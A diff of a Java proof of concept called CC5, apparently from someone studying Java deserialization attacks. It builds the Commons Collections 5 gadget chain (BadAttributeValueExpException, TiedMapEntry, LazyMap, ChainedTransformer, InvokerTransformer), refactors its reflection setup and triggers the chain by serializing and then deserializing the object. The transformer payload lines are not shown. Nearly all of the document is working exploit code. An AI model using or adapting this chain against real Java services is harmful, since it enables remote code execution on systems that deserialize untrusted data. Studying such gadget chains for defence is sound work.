@@ -16,7 +16,22 @@ import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
 
+/*
+* BadAttributeValueExpException.readObject()
+*  ->TiedMapEntry.toString()
+*   ->TiedMapEntry.getValue()
+*    ->LazyMap.get()
+*     ->ChainedTransformer.transform()
+*      ->InvokerTransformer.transform()
+* */
+
 public class CC5 {
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
     public static void main(String[] args) throws Exception {
         Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
         Transformer[] transformers = new Transformer[]{
@@ -35,15 +50,11 @@ public class CC5 {
         Map<Object, Object> hashMap = new HashMap<>();
         Map innerMap = LazyMap.decorate(hashMap,transformerChain);
         TiedMapEntry mapEntry = new TiedMapEntry(innerMap,"3xsh0re");
-        BadAttributeValueExpException attributeValue = new BadAttributeValueExpException(mapEntry);
+        BadAttributeValueExpException attributeValue = new BadAttributeValueExpException(null);
 
-        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
-        f.setAccessible(true);
-        f.set(transformerChain,transformers);
-
-        Field f2 = BadAttributeValueExpException.class.getDeclaredField("val");
-        f2.setAccessible(true);
-        f2.set(attributeValue,mapEntry);
+        setFieldValue(transformerChain,"iTransformers",transformers);
+        setFieldValue(attributeValue,"val",mapEntry);
+        hashMap.remove("3xsh0re");
 
         // 测试
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
@@ -53,5 +64,4 @@ public class CC5 {
         ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
         ois.readObject();
     }
-
 }
